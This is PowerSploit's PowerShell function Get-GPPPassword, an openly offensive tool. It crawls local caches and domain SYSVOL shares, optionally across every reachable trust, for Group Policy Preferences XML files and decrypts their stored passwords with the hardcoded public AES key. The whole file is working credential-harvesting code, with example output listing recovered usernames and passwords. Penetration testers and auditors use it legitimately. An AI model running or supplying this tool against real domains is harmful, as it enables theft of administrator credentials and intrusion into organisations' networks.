function Get-GPPPassword {
<#
.SYNOPSIS

Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.

PowerSploit Function: Get-GPPPassword  
Author: Chris Campbell (@obscuresec)  
License: BSD 3-Clause  
Required Dependencies: None  
Optional Dependencies: None  

.DESCRIPTION

Get-GPPPassword searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.

.PARAMETER Server

Specify the domain controller to search for.
Default's to the users current domain

.PARAMETER SearchForest

Map all reaschable trusts and search all reachable SYSVOLs.

.EXAMPLE

Get-GPPPassword

NewName   : [BLANK]
Changed   : {2014-02-21 05:28:53}
Passwords : {password12}
UserNames : {test1}
File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\DataSources.xml

NewName   : {mspresenters}
Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
Passwords : {Recycling*3ftw!, password123, password1234}
UserNames : {Administrator (built-in), DummyAccount, dummy2}
File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml

NewName   : [BLANK]
Changed   : {2014-02-21 05:29:53, 2014-02-21 05:29:52}
Passwords : {password, password1234$}
UserNames : {administrator, admin}
File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml

NewName   : [BLANK]
Changed   : {2014-02-21 05:30:14, 2014-02-21 05:30:36}
Passwords : {password, read123}
UserNames : {DEMO\Administrator, admin}
File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services\Services.xml

.EXAMPLE

Get-GPPPassword -Server EXAMPLE.COM

NewName   : [BLANK]
Changed   : {2014-02-21 05:28:53}
Passwords : {password12}
UserNames : {test1}
File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB982DA}\MACHINE\Preferences\DataSources\DataSources.xml

NewName   : {mspresenters}
Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
Passwords : {Recycling*3ftw!, password123, password1234}
UserNames : {Administrator (built-in), DummyAccount, dummy2}
File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB9AB12}\MACHINE\Preferences\Groups\Groups.xml

.EXAMPLE

Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq

password
password12
password123
password1234
password1234$
read123
Recycling*3ftw!

.LINK

http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SearchForest
    )

    # define helper function that decodes and decrypts password
    function Get-DecryptedCpassword {
        [CmdletBinding()]
        Param (
            [string] $Cpassword
        )

        try {
            #Append appropriate padding based on string length
            $Mod = ($Cpassword.length % 4)

            switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
            # Make sure System.Core is loaded
            [System.Reflection.Assembly]::LoadWithPartialName("System.Core") |Out-Null

            #Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

            #Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length)
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor()
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        }

        catch { Write-Error $Error[0] }
    }

    # helper function to parse fields from xml files
    function Get-GPPInnerField {
    [CmdletBinding()]
        Param (
            $File
        )

        try {
            $Filename = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)

            # check for the cpassword field
            if ($Xml.innerxml -match 'cpassword') {

                $Xml.GetElementsByTagName('Properties') | ForEach-Object {
                    if ($_.cpassword) {
                        $Cpassword = $_.cpassword
                        if ($Cpassword -and ($Cpassword -ne '')) {
                           $DecryptedPassword = Get-DecryptedCpassword $Cpassword
                           $Password = $DecryptedPassword
                           Write-Verbose "[Get-GPPInnerField] Decrypted password in '$File'"
                        }

                        if ($_.newName) {
                            $NewName = $_.newName
                        }

                        if ($_.userName) {
                            $UserName = $_.userName
                        }
                        elseif ($_.accountName) {
                            $UserName = $_.accountName
                        }
                        elseif ($_.runAs) {
                            $UserName = $_.runAs
                        }

                        try {
                            $Changed = $_.ParentNode.changed
                        }
                        catch {
                            Write-Verbose "[Get-GPPInnerField] Unable to retrieve ParentNode.changed for '$File'"
                        }

                        try {
                            $NodeName = $_.ParentNode.ParentNode.LocalName
                        }
                        catch {
                            Write-Verbose "[Get-GPPInnerField] Unable to retrieve ParentNode.ParentNode.LocalName for '$File'"
                        }

                        if (!($Password)) {$Password = '[BLANK]'}
                        if (!($UserName)) {$UserName = '[BLANK]'}
                        if (!($Changed)) {$Changed = '[BLANK]'}
                        if (!($NewName)) {$NewName = '[BLANK]'}

                        $GPPPassword = New-Object PSObject
                        $GPPPassword | Add-Member Noteproperty 'UserName' $UserName
                        $GPPPassword | Add-Member Noteproperty 'NewName' $NewName
                        $GPPPassword | Add-Member Noteproperty 'Password' $Password
                        $GPPPassword | Add-Member Noteproperty 'Changed' $Changed
                        $GPPPassword | Add-Member Noteproperty 'File' $File
                        $GPPPassword | Add-Member Noteproperty 'NodeName' $NodeName
                        $GPPPassword | Add-Member Noteproperty 'Cpassword' $Cpassword
                        $GPPPassword
                    }
                }
            }
        }
        catch {
            Write-Warning "[Get-GPPInnerField] Error parsing file '$File' : $_"
        }
    }

    # helper function (adapted from PowerView) to enumerate the domain/forest trusts for a specified domain
    function Get-DomainTrust {
        [CmdletBinding()]
        Param (
            $Domain
        )

        if (Test-Connection -Count 1 -Quiet -ComputerName $Domain) {
            try {
                $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
                $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
                if ($DomainObject) {
                    $DomainObject.GetAllTrustRelationships() | Select-Object -ExpandProperty TargetName
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrust] Error contacting domain '$Domain' : $_"
            }

            try {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Domain)
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
                if ($ForestObject) {
                    $ForestObject.GetAllTrustRelationships() | Select-Object -ExpandProperty TargetName
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrust] Error contacting forest '$Domain' (domain may not be a forest object) : $_"
            }
        }
    }

    # helper function (adapted from PowerView) to enumerate all reachable trusts from the current domain
    function Get-DomainTrustMapping {
        [CmdletBinding()]
        Param ()

        # keep track of domains seen so we don't hit infinite recursion
        $SeenDomains = @{}

        # our domain stack tracker
        $Domains = New-Object System.Collections.Stack

        try {
            $CurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object -ExpandProperty Name
            $CurrentDomain
        }
        catch {
            Write-Warning "[Get-DomainTrustMapping] Error enumerating current domain: $_"
        }

        if ($CurrentDomain -and $CurrentDomain -ne '') {
            $Domains.Push($CurrentDomain)

            while($Domains.Count -ne 0) {

                $Domain = $Domains.Pop()

                # if we haven't seen this domain before
                if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {

                    Write-Verbose "[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'"

                    # mark it as seen in our list
                    $Null = $SeenDomains.Add($Domain, '')

                    try {
                        # get all the domain/forest trusts for this domain
                        Get-DomainTrust -Domain $Domain | Sort-Object -Unique | ForEach-Object {
                            # only output if we haven't already seen this domain and if it's pingable
                            if (-not $SeenDomains.ContainsKey($_) -and (Test-Connection -Count 1 -Quiet -ComputerName $_)) {
                                $Null = $Domains.Push($_)
                                $_
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[Get-DomainTrustMapping] Error: $_"
                    }
                }
            }
        }
    }

    try {
        $XMLFiles = @()
        $Domains = @()

        $AllUsers = $Env:ALLUSERSPROFILE
        if (-not $AllUsers) {
            $AllUsers = 'C:\ProgramData'
        }

        # discover any locally cached GPP .xml files
        Write-Verbose '[Get-GPPPassword] Searching local host for any cached GPP files'
        $XMLFiles += Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue

        if ($SearchForest) {
            Write-Verbose '[Get-GPPPassword] Searching for all reachable trusts'
            $Domains += Get-DomainTrustMapping
        }
        else {
            if ($Server) {
                $Domains += , $Server
            }
            else {
                # in case we're in a SYSTEM context
                $Domains += , [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object -ExpandProperty Name
            }
        }

        $Domains = $Domains | Where-Object {$_} | Sort-Object -Unique

        ForEach ($Domain in $Domains) {
            # discover potential domain GPP files containing passwords, not complaining in case of denied access to a directory
            Write-Verbose "[Get-GPPPassword] Searching \\$Domain\SYSVOL\*\Policies. This could take a while."
            $DomainXMLFiles = Get-ChildItem -Force -Path "\\$Domain\SYSVOL\*\Policies" -Recurse -ErrorAction SilentlyContinue -Include @('Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml')

            if($DomainXMLFiles) {
                $XMLFiles += $DomainXMLFiles
            }
        }

        if ( -not $XMLFiles ) { throw '[Get-GPPPassword] No preference files found.' }

        Write-Verbose "[Get-GPPPassword] Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."

        ForEach ($File in $XMLFiles) {
            $Result = (Get-GppInnerField $File.Fullname)
            $Result
        }
    }

    catch { Write-Error $Error[0] }
}
